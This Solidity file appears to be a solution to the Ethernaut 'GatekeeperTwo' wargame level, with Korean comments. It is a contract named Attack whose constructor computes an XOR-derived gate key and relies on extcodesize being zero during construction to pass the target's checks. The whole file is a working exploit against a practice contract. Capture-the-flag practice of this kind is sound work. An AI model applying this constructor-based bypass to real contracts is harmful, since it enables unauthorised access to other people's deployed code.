// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Itarget {
    function enter(bytes8) external returns (bool) ;
}

contract Attack {
    constructor(address _target) {
        // Gate Two 우회: 생성자에서 호출하면 extcodesize == 0
        
        // Gate Three: gateKey 계산
        bytes8 myHash = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 gateKey = myHash ^ 0xFFFFFFFFFFFFFFFF;
        
        // Gate One은 자동으로 만족 (컨트랙트 → GatekeeperTwo)
        Itarget(_target).enter(gateKey);
    }
}